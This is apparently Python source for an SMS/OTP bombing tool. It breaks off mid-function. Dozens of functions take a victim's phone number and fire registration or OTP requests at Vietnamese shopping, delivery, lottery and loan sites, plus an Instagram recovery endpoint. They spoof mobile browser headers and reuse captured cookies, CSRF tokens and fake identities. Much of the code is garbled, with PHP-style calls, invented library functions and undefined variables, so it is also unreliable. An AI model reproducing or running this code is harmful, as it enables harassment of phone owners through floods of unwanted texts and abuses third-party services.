        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8",
        "Accept": "application/json",
        "BROWSER-VERSION": "112",
        "App-Version-Code": "10000",
        "PLATFORM": "Web",
        "BROWSER-NAME": "Chrome",
        "sec-ch-ua-platform": "Android",
        "Origin": "https://selly.vn",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://selly.vn/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    response = requests.post(url, data=datajson, headers=headers)

def KIDSPLAZA(sdt):
    headers = {
        "Host": "www.kidsplaza.vn",
        "content-length": "154",
        "accept": "/",
        "content-type": "application/json",
        "x-requested-with": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "Android",
        "origin": "https://www.kidsplaza.vn",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.kidsplaza.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "cookie": "cdpblockedsid822178=2"
    }

    data = {
        "data": {
            "password": "Vrxx#1337",
            "confirmpassword": "Vrxx#1337",
            "phone": sdt,
            "email": "vexnolove03@gmail.com",
            "name": "Ahad Kumar",
            "websiteid": "1"
        }
    }

    datajson = json.dumps(data)

    response = requests.post("https://www.kidsplaza.vn/rest/hn/V1/customer/account/register/on-site", data=datajson, headers=headers)

def ICANKID(sdt):
    headers = {
        "Host": "id.icankid.vn",
        "Connection": "keep-alive",
        "Content-Length": "134",
        "sec-ch-ua-platform": "Android",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "content-type": "application/json",
        "Accept": "/",
        "Origin": "https://id.icankid.vn",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://id.icankid.vn/auth",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "Cookie": "gaLM3PQNHV6S=GS1.1.1683042907.1.0.1683042907.60.0.0; gclau=1.1.888294803.1683042909; gaJLL9R732MK=GS1.1.1683042909.1.0.1683042909.0.0.0; gaFMXKZXNRJB=GS1.1.1683042909.1.0.1683042909.60.0.0; hjSessionUser3154488=eyJpZCI6IjFlZDBjZjEzLTk1NTYtNWFiYi1hNjZkLWVhYzZhMmJkYTljZCIsImNyZWF0ZWQiOjE2ODMwNDI5MDk5NDYsImV4cFtim5n0aW5nIjpmYWxzZX0=; hjFirstSeen=1; hjIncludedInSessionSample3154488=0; hjSession3154488=eyJpZCI6IjJlZmFjYjk2LWQ4NWEtNGY3NC1iYjdiLWEyMjRmNDQ5YzQ3YiIsImNyZWF0ZWQiOjE2ODMwNDI5MDk5ODMsImluU2FtcGxlIjpmYWxzZX0=; hjAbsoluteSessionInProgress=1; gid=GA1.2.665729834.1683042910; gatgtagUA2014622504=1; gatUA-222516876-1=1; fbp=fb.1.1683042910188.410123624; gaT14T78MGX8=GS1.1.1683042910.1.0.1683042910.0.0.0; ga=GA1.1.820789589.1683042908; ga5KHZV6MD4J=GS1.1.1683042915.1.0.1683042916.0.0.0; ga=GA1.3.820789589.1683042908; gid=GA1.3.665729834.1683042910; gatUA-213798897-3=1"
    }

    data = {
        "phone": sdt,
        "challengecode": "674b72a1c98013e2fb629e19236d592c466b3de750584c974bba31377c283c00",
        "challengemethod": "SHA256"
    }

    datajson = json.dumps(data)
    
    response = requests.post("https://id.icankid.vn/api/otp/challenge/", headers=headers, data=datajson)                                                       
    
def RIVIU(sdt):
    headers = {
        "Host": "production-account.riviu.co",
        "content-length": "63",
        "appversion": "3.1.6",
        "deviceid": "3723142086",
        "language": "vi",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "content-type": "application/json;charset=UTF-8",
        "regionuuid": "112f7e2e9da240be937daa66b1c4d1ce",
        "accept": "application/json, text/plain, */*",
        "platform": "web",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://riviu.vn",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://riviu.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    datastring = json.dumps(data)
    response = requests.post('https://production-account.riviu.co/v1.0/otp/generate', headers=headers, data=datastring, verify=False)
 
def VOSO(sdt):
    headers = {
        "Host": "voso.vn",
        "content-length": "244",
        "accept": "application/json, text/javascript, /; q=0.01",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "x-requested-with": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://voso.vn",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://voso.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "cookie": "hjAbsoluteSessionInProgress=0"
    }
    
    data = {
        "name": "Nguyen Van Tuan Anh",
        "email": "botvexzxje2@gmail.com",
        "phone": sdt,
        "step": "1",
        "otp": "",
        "resendotp": "0",
        "otpToken": "",
        "password": "Vrxx#1337",
        "repassword": "Vrxx#1337",
        "csrf": "BXHlLomLJsUPjoAGs61hC-B0xJrzBlzFXUvGPwnC6vJo3lyB4d8URUbnQtvt7uXrflUAq-TjJNIlZxscT2Tw=="
    }
    
    url = "https://voso.vn/auth/signupv2"
    data = urllib.parse.urlencode(data)
    data = data.encode('ascii')
    
    req = urllib.request.Request(url, data, headers)

def THITRUONGSI(sdt):
    headers = {
        "Host": "api.thitruongsi.com",
        "content-length": "641",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://m.thitruongsi.com",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://m.thitruongsi.com/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    
    data = {
        "account_phone": sdt
    }
    
    url = "https://api.thitruongsi.com/v1/user/api/v4/users/register/step1-phone"

def BATDONGSAN(sdt):
  proxy = "http://9abf8e9bd90b41dd23687146da590a43751761ee:js_render=true@proxy.zenrows.com:8001"
  opts = {
    "http": {"proxy": proxy},
    "https": {"proxy": proxy}
  }
  context = ssl._create_default_https_context()
  context.set_proxy(proxy, 'http')
  context.set_proxy(proxy, 'https')
  url = "https://m.batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister?phoneNumber=" + sdt
  response = urllib.request.urlopen(url)

def KIOTVIET(sdt):
    rds = ''.join(random.sample("0123456789abcdef", 7))

    headers = {
        "Host": "www.kiotviet.vn",
        "Content-Length": "287",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Sec-Ch-Ua-Mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Sec-Ch-Ua-Platform": "Android",
        "Origin": "https://www.kiotviet.vn",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.kiotviet.vn/dang-ky-webapp/?refcode=746&utm_source=Google&utm_medium=KiotViet-Key&utm_campaign=Google-Search&utm_content=Mien-phi-dung-thu&gclid=Cj0KCQjw6cKiBhD5ARIsAKXUdyZGr2ovb76mSfl9j8WvmE9G_wDG_f41FdoraYaOHIgHzJgOYJ-Y2nEaAicJEALw_wcB",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "Cookie": "source_referer=%5B%22refcode%7C746%7C2023-05-03%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCj0KCQjw6cKiBhD5ARIsAKXUdyZGr2ovb76mSfl9j8WvmE9G_wDG_f41FdoraYaOHIgHzJgOYJ-Y2nEaAicJEALw_wcB%2C%22%2C%22http-referral%7Cm.kiotviet.vn%7C2023-05-03%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCj0KCQjw6cKiBhD5ARIsAKXUdyZGr2ovb76mSfl9j8WvmE9G_wDG_f41FdoraYaOHIgHzJgOYJ-Y2nEaAicJEALw_wcB%2C%22%2C%22http-referral%7Cwww.google.com%7C2023-05-03%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCj0KCQjw6cKiBhD5ARIsAKXUdyZGr2ovb76mSfl9j8WvmE9G_wDG_f41FdoraYaOHIgHzJgOYJ-Y2nEaAicJEALw_wcB%2C%22%5D"
    }

    payload = {
        "phone": "+84" + sdt[1:11],
        "code": rds,
        "name": "Ahad+Kumar",
        "email": "vexnolovr03%40gmail.com",
        "zone": "An+Giang+-+Huy%E1%BB%87n+An+Ph%C3%BA",
        "merchant": rds,
        "username": sdt,
        "industry": "%C4%90i%E1%BB%87n+tho%E1%BA%A1i+%26+%C4%90i%E1%BB%87n+m%C3%A1y",
        "ref_code": "746",
        "industry_id": "65",
        "phone_input": sdt
    }

    response = requests.post("https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php", data=payload, headers=headers)

def BIBABO(sdt):
    Headers = {
        "Host": "bibabo.vn",
        "Connection": "keep-alive",
        "Content-Length": "64",
        "Accept": "/",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "Origin": "https://bibabo.vn",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://bibabo.vn/user/signupPhone",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "Cookie": "uibi=eyJpdiI6IlQyam9wWko1MGRQVXNTMnZOZEZpWGc9PSIsInZhbHVlIjoiYjV5SlR1V0tVbjdFNFwvK2FBUzIwbWZWT0YzOUdvR2cyQzZKQXI5OHFKOHM9IiwibWFjIjoiZmFiZWVkOTA0ZmE3NjJkZTRhMzI4MGQ0OWQxMTBjMmZmZjQ2ZTc0ZGYxODhlMmFiNTMwMzVlZjc0Y2MyMTg2NCJ9; ga=GA1.2.55963624.1683002314; gid=GA1.2.593754343.1683002314; mp376a95ebc99b460db45b090a5936c5demixpanel=%7B%22distinctid%22%3A%20%22%24device%3A187dac14eee542-0abbcdad261932-3a6c1b2b-46500-187dac14eee542%22%2C%22%24deviceid%22%3A%20%22187dac14eee542-0abbcdad261932-3a6c1b2b-46500-187dac14eee542%22%2C%22%24initialreferrer%22%3A%20%22https%3A%2F%2Fbibabo.vn%2Fhome%22%2C%22%24initialreferringdomain%22%3A%20%22bibabo.vn%22%7D; gat=1; gaVisitorUuid=47008ca1-32a0-4daa-9694-e36807c4dd91; fbp=fb.1.1683002315008.1108739564; XSRF-TOKEN=eyJpdiI6InNtOGtVeHBSZmVoQjR0N1wvRW1hckF3PT0iLCJ2YWx1ZSI6IlNLQ0p3UFlUZGhjdENKSFM1cHdLeXJGcFVGaE1EaDNKa0VRNk40cWo1enFCTERSTVowaEczSzc0WitTNks4am9VcE40KzAzVCtwbUVkeGVZUE1mcER3PT0iLCJtYWMiOiIzYzAxZGZmNzMxOWM3NWExOTY1MmFmYjNkMzhiOGM4OGNhMDQxNmRhZDA4YTY2ZmZhOTNjY2RhN2FiZjZlOTVmIn0%3D; laravelsession=eyJpdiI6Ind5blczNnFrMzRWbTJEbDRVcGNRaXc9PSIsInZhbHVlIjoiZXQyQUJoS3NuTXd4RUljMEhLQUZkS0Q0MEdSdGUrb09PdURXSm03d2xOS2pDRThjbERCUzlyeEpTR3VHTVUxOXd0UTVOVnppXC92WVFyOTZKS240KzBnPT0iLCJtYWMiOiJjMWQ5MWQ5YjdjYTZlODc5MjI2YmNjZTM5YjZlMWVmMThiYmRlMTIzYTI1M2E1YmIzZDc5MDExNGJlODRhYjUwIn0%3D"
    }
    Payload = {
        "phone": sdt,
        "token": "UkkqP4eM9cqQBNTTmbUOJinoUZmcEnSE8wwqJ6VS"
    }
    response = requests.post("https://bibabo.vn/user/verify-phone", headers=Headers, data=Payload)

def SWIFT247(sdt):
    url = "https://api.swift247.vn/v1/checkphone"
    headers = {
        "Host": "api.swift247.vn",
        "content-length": "23",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://app.swift247.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://app.swift247.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    response = requests.post(url, headers=headers, data=json.dumps(postdata))
    
    if "OTPNOCONFIRMED" in response.text:
        url = "https://api.swift247.vn/v1/requestnewotp"
        response = requests.post(url, headers=headers, data=json.dumps(postdata))
        
def KILO(sdt):
    headers = {
        "Host": "api.kilo.vn",
        "content-length": "54", 
        "app-version": "1", 
        "x-correlation-id": "d5afa9c6-73cb-47bf-ad42-0672912b725b", 
        "sec-ch-ua-mobile": "?1", 
        "authorization": "Bearer undefined", 
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36", 
        "content-type": "application/json", 
        "accept": "application/json", 
        "i18next-language": "vi", 
        "api-version": "2", 
        "platform": "SELLER_WEB", 
        "sec-ch-ua-platform": "\"Android\"", 
        "origin": "https://seller.kilo.vn", 
        "sec-fetch-site": "same-site", 
        "sec-fetch-mode": "cors", 
        "sec-fetch-dest": "empty",
        "referer": "https://seller.kilo.vn/", 
        "accept-encoding": "gzip, deflate, br", 
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    
    email = random_string(6) + "@gmail.com"
    data = json.dumps({"phone": sdt, "email": email})
    
    response = requests.post("https://api.kilo.vn/users/check-new-user", headers=headers, data=data)

def GAPO(sdt):
    Headers = [
        "Host: api.gapo.vn",
        "Content-Length: 31",
        "Content-Type: application/json",
        "Sec-Ch-Ua-Mobile: ?1",
        "Authorization: Bearer",
        "User-Agent: Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Sec-Ch-Ua-Platform: \"Android\"",
        "Accept: */*",
        "Origin: https://www.gapo.vn",
        "Sec-Fetch-Site: same-site",
        "Sec-Fetch-Mode: cors",
        "Sec-Fetch-Dest: empty",
        "Referer: https://www.gapo.vn/",
        "Accept-Encoding: gzip, deflate, br",
        "Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    ]
    Data = {
        "device_id": "30a1bfa0-533f-45e9-be60-b48fb8977df2",
        "phone_number": "+84-" + sdt[1:11],
        "otp_type": 0
    }
    Options = {
        "http": {
            "header": "\r\n".join(Headers),
            "method": "POST",
            "content": json.dumps(Data),
            "ignore_errors": True
        }
    }
    Context = contextlib._stream_guarded_by_crtp(stream_context, Options)
    Result = urllib.request.urlopen("https://api.gapo.vn/auth/v2.0/signup", context=Context).read()      

def PHUCLONG(sdt):
    headers = {
        "Host": "api-crownx.winmart.vn",
        "content-length": "126",
        "accept": "application/json",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "authorization": "Bearer undefined",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "Android",
        "origin": "https://order.phuclong.com.vn",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://order.phuclong.com.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    
    data = {'phoneNumber': sdt, 'fullName': 'Nguyễn Đặng Hoàng Hải', 'email': 'vexnolove03@gmail.com', 'password': 'Vrxx#1337'}
    datason = json.dumps(data)
    response = requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/register', headers=headers, data=datason)

def VIETLOTT(sdt):
    headers = {
        "Host": "api-mobi.vietlottsms.vn",
        "Connection": "keep-alive",
        "Content-Length": "28",
        "ClientCallAPI": "EMB",
        "deviceId": "",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "Accept": "/",
        "partnerChannel": "WEB",
        "Identify-Device-Token": "",
        "checkSum": "887e5218c679e1fe26b48cc642532a39909f619868f09d415b7d13cd43784f36",
        "sec-ch-ua-platform": "\"Android\"",
        "Origin": "https://vietlott-sms.vn",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://vietlott-sms.vn/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }

    data = {'phoneNumber': sdt}
    datason = json.dumps(data)
    response = requests.post('https://api-mobi.vietlottsms.vn/mobile-api/register/registerWithPhoneNumber',
                             headers=headers, data=datason)

def GOTADI(sdt):
    headers = {
        "Host": "api.gotadi.com",
        "content-length": "44",
        "sec-ch-ua": "\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"",
        "accept": "application/json",
        "sec-ch-ua-platform": "\"Android\"",
        "gtd-client-tracking-device-id": "85519cab-85d7-4881-abfa-65d2a2bb3a52",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Linux x8664; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
        "content-type": "application/json",
        "origin": "https://www.gotadi.com",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.gotadi.com/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }

    postData = {
        "phoneNumber": sdt,
        "language": "VI"
    }

    data = json.dumps(postData)

    response = requests.post("https://api.gotadi.com/b2c-web/api/register/phone-number/resend-otp", data=data, headers=headers)
                                                                                             
def VAMO(sdt):
    headers = [
        "Host: vamo.vn",
        "Content-Length: 24",
        "sec-ch-ua: \"Chromium\";v=\"112\", \"Google Chrome\";v=\"112\", \"Not:A-Brand\";v=\"99\"",
        "Accept: application/json, text/plain, */*",
        "Content-Type: application/json",
        "sec-ch-ua-mobile: ?1",
        "User-Agent: Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform: \"Android\"",
        "Origin: https://vamo.vn",
        "Sec-Fetch-Site: same-origin",
        "Sec-Fetch-Mode: cors",
        "Sec-Fetch-Dest: empty",
        "Referer: https://vamo.vn/app/login",
        "Accept-Encoding: gzip, deflate, br",
        "Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "Cookie: _ga_1HXSGSN1HG=GS1.1.1683203760.3.1.1683203783.0.0.0"
    ]
    data = json.dumps({"username": sdt[1:11]})
    options = {
        "http": {
            "method": "POST",
            "header": "\r\n".join(headers),
            "content": data,
        },
    }
    context = ssl._create_unverified_context()
    response = urlopen("https://vamo.vn/ws/api/public/login-with-otp/generate-otp", context=context)

def OLDFACEBOOK(sdt):
    url = "https://www.instagram.com/accounts/accountrecoverysendajax/"
    data = "emailorusername=" + urlencode(sdt) + "&recaptchachallengefield="
    headers = [
        "Content-Type: application/x-www-form-urlencoded",
        "X-Requested-With: XMLHttpRequest",
        "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 1323 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
        "x-csrftoken: EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"
    ]
    opts = {
        "http": {
            "method": "POST",
            "header": "\r\n".join(headers),
            "content": data
        }
    }
    context = ssl.createunverifiedcontext()
    response = urllib.request.urlopen(url, data=data.encode('utf-8'), context=context)

def WINMART(sdt):
    url = "https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo=" + urlencode(sdt)
    response = urllib.request.urlopen(url)     

def FUNRING(sdt):
    Headers = {
        "Host": "funring.vn",
        "Connection": "keep-alive",
        "Content-Length": "28",
        "Accept": "*/*",
        "User-Agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
        "Content-Type": "application/json",
        "Origin": "http://funring.vn",
        "Referer": "http://funring.vn/module/register_mobile.jsp",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "Cookie": "JSESSIONID=NODE011a2c48nzutiw8p6cy3nabxbx974764.NODE01; _ga=GA1.2.1626827841.1679236846; _gid=GA1.2.888694467.1679236846; _gat=1"
    }
    Data = "username=" + sdt
    GET = curl("POST", "https://funring.vn/api/v1.0.1/jersey/user/getotp", Data, Headers, True)

def THANTAIOI(sdt):
        head = [
            "Host: api.thantaioi.vn",
            "accept-language: vi",
            "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
            "content-type: application/json",
            "authorization: Bearer " + token,
            "accept: */*",
            "origin: https://thantaioi.vn",
            "referer: https://thantaioi.vn/",
        ]
        get = json.decode(CURL("GET", "https://api.thantaioi.vn/api/user/phone-confirmation-code", None, head, False), true)
 
def VAYSIEUDE(sdt):
    headers = {
        "Host": "vaysieude.com",
        "cache-control": "max-age=0",
        "upgrade-insecure-requests": "1",
        "origin": "https://vaysieude.com",
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "referer": "https://vaysieude.com/?click_id=643f76517a519600011858c1",
        "cookie": "XSRF-TOKEN=eyJpdiI6IlR2V3FVWWNXWTlMTTlWU2EySDg2V1E9PSIsInZhbHVlIjoiRzBnTHpBVUJhdFlxWWEwMHh5YVhJNmlLQnRuQjFINzl4QVBLL3Q0SVhNV0N5RHoxY1d3RWMrSVBveHRiOTBCTFB3bkp1YWtRdEtMb2JUc002UFA3YUY4VjZXTVpZUVgvNjR5N3pyeFhPeHEwbm9jT1R2ZlBqbmlaWFcwVnNGZEkiLCJtYWMiOiI1NmExYjgxZmM1MDhhMzRkNWE0Nzc0OGQ4OThhMTc2Yjk5ZGJiMjg0ZmY2Nzg1OWYwZjY3NWY5ZDI1ZjNlMDhlIn0%3D;laravel_session=eyJpdiI6ImdHZjRKWmJJaW1XZXZ3Vk8zV2kyTGc9PSIsInZhbHVlIjoic2kyZTNYWTY3SEZVM1gxZDc3UGd5ZGFpRjVBMFRwM3hiTEo0NU1BYVkzeThCb3p1bzRvMlVUdWI3elh0N3c1QmxMb3VNMEtvTFpsMW1qUVVmTmRqWE4wdWl1S2N0ajRGbWRTM1FZaUJoN21QNHgyeFBqd21VMHVBVHpmS21pMUEiLCJtYWMiOiJjMDdmM2RhMDEwYWY2Zjg5NTI5OTBjMTZjZDlkYzA5Zjc1OWUzNGFhYTI0ZjVmN2E1NDMzZDRmZWRkZTRjNThjIn0%3D"
    }

    # GET request
    response = requests.get("https://vaysieude.com/?click_id=643f76517a519600011858c1", headers=headers)
    soup = BeautifulSoup(response.content, "html.parser")
    token = soup.find("input", {"name": "_token"}).get("value")

    # POST request
    data = {
        "_token": token,
        "loan[loan_amount]": "20000000",
        "loan[full_name]": "Không biết",
        "loan[identity]": "123456789",
        "loan[phone]": sdt
    }
    response = requests.post("https://vaysieude.com/?click_id=643f76517a519600011858c1", data=data, headers=headers)

def AHAMOVE(sdt):
    headers = {
        "Host": "api.ahamove.com",
        "cache-control": "max-age=0",
        "upgrade-insecure-requests": "1",
        "origin": "https://app.ahamove.com",
        "content-type": "application/json;charset=UTF-8",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
        "accept": "application/json, text/plain, */*",
        "referer": "https://app.ahamove.com/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
    }
    mail = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=6)) + '@gmail.com'
    data = {
        'mobile': sdt,
        'name': 'Tuấn',
        'email': mail,
        'country_code': 'VN',
        'firebase_sms_auth': True
    }
    response = requests.post("https://api.ahamove.com/api/v3/public/user/register", json=data, headers=headers)

def CAYDENTHAN(sdt):
    sdt = "84" + sdt
    sdt = "84" + sdt.replace("840", "")
    head = [
        "Host: api.caydenthan.vn",
        "accept-language: vi",
        "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type: application/json",
        "accept: */*",
        "origin: https://caydenthan.vn",
        "referer: https://caydenthan.vn/",
    ]
    data = '{"full_name":"Khang pro","first_name":"pro","last_name":"Khang","mobile_phone":"' + sdt + '","target_url":"caydenthan.vn/"}'
    get = json_decode(CURL("POST", "https://api.caydenthan.vn/api/user", data, head, false), true)
    token = get["token"]
    if token:
        head = [
            "Host: api.caydenthan.vn",
            "accept-language: vi",
